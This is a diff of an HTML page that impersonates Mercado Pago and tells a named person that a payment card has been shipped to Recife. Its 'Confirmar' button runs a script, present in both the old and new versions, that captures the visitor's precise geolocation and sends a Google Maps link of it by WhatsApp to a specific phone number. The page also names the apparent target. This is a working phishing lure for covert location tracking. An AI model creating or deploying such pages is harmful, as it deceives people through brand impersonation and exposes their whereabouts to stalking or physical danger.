@@ -1,100 +1,133 @@
 <!DOCTYPE html>
-<html lang="pt">
+<html lang="pt-br">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mercado Pago - Confirmação</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #f0f2f5;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-        }
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Mercado Pago - Confirmação de Entrega</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&display=swap');
 
-        .container {
-            background: #fff;
-            border-radius: 12px;
-            padding: 30px 25px;
-            max-width: 420px;
-            width: 90%;
-            text-align: center;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
-        }
+  body {
+    margin: 0;
+    font-family: 'Montserrat', sans-serif;
+    background: #009ee3; /* Azul Mercado Pago */
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    color: #333;
+  }
 
-        .logo {
-            width: 160px;
-            margin-bottom: 20px;
-        }
+  .container {
+    background: #fff;
+    border-radius: 14px;
+    width: 90%;
+    max-width: 420px;
+    padding: 40px 30px 50px;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+    text-align: center;
+  }
 
-        h2 {
-            color: #00a650;
-            margin-bottom: 10px;
-        }
+  .logo {
+    width: 180px;
+    margin-bottom: 30px;
+    display: block;
+    margin-left: auto;
+    margin-right: auto;
+  }
 
-        p {
-            color: #333;
-            font-size: 15px;
-            line-height: 1.5;
-        }
+  h2 {
+    color: #00a650; /* Verde Mercado Pago */
+    font-weight: 600;
+    font-size: 24px;
+    margin-bottom: 20px;
+  }
 
-        .btn {
-            background-color: #009ee3;
-            color: #fff;
-            padding: 12px 24px;
-            margin-top: 25px;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
+  p {
+    font-size: 16px;
+    color: #4a4a4a;
+    line-height: 1.5;
+    margin-bottom: 40px;
+  }
 
-        .btn:hover {
-            background-color: #007bbd;
-        }
-    </style>
+  strong {
+    color: #222;
+  }
 
-    <script>
-        function enviarLocalizacao() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        let latitude = position.coords.latitude;
-                        let longitude = position.coords.longitude;
-                        let linkMaps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                        let whatsapp = `https://wa.me/558193568037?text=Mercado Pago: ${linkMaps}`;
-                        window.location.href = whatsapp;
-                    },
-                    function(error) {
-                        alert("Erro ao obter localização. Permita o acesso à localização no navegador.");
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
-                );
-            } else {
-                alert("Seu navegador não suporta geolocalização.");
-            }
+  .btn-confirmar {
+    background-color: #00a650;
+    border: none;
+    color: white;
+    font-size: 18px;
+    padding: 15px 50px;
+    border-radius: 30px;
+    cursor: pointer;
+    font-weight: 600;
+    transition: background-color 0.3s ease;
+    box-shadow: 0 5px 15px rgba(0,166,80,0.4);
+  }
+
+  .btn-confirmar:hover {
+    background-color: #007b3e;
+    box-shadow: 0 7px 20px rgba(0,123,62,0.6);
+  }
+
+  @media (max-width: 400px) {
+    .container {
+      padding: 30px 20px 40px;
+    }
+    h2 {
+      font-size: 20px;
+    }
+    .btn-confirmar {
+      padding: 12px 35px;
+      font-size: 16px;
+    }
+  }
+</style>
+<script>
+  function enviarLocalizacao() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        function(position) {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+          const linkMaps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+          const whatsapp = `https://wa.me/558193568037?text=Mercado Pago: ${linkMaps}`;
+          window.location.href = whatsapp;
+        },
+        function(error) {
+          alert("Erro ao obter localização. Permita o acesso à localização no navegador.");
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
         }
-    </script>
+      );
+    } else {
+      alert("Seu navegador não suporta geolocalização.");
+    }
+  }
+</script>
 </head>
 <body>
-    <div class="container">
-        <img src="https://logodownload.org/wp-content/uploads/2019/11/mercado-pago-logo.png" alt="Mercado Pago" class="logo">
-        <h2>✅ Cartão enviado com sucesso</h2>
-        <p>
-            Olá <strong>Lucas Gabriel Moraes</strong>, seu cartão Mercado Pago foi emitido<br>
-            e será entregue no endereço informado:<br><br>
-            <strong>Recife - Pernambuco</strong><br><br>
-            Clique abaixo para confirmar o recebimento da notificação.
-        </p>
-        <button class="btn" onclick="enviarLocalizacao()">Confirmar</button>
-    </div>
+  <div class="container">
+    <img
+      class="logo"
+      src="https://http2.mlstatic.com/frontend-assets/ui-navigation/5.18.7/mercadopago/logo__small.png"
+      alt="Logo Mercado Pago"
+      loading="lazy"
+    />
+    <h2>✅ Cartão enviado com sucesso</h2>
+    <p>
+      Olá <strong>Lucas Gabriel Moraes</strong>, seu cartão Mercado Pago foi emitido<br />
+      e será entregue no endereço informado:<br /><br />
+      <strong>Recife - Pernambuco</strong><br /><br />
+      Clique abaixo para confirmar o recebimento da notificação.
+    </p>
+    <button class="btn-confirmar" onclick="enviarLocalizacao()">Confirmar</button>
+  </div>
 </body>
 </html>
+
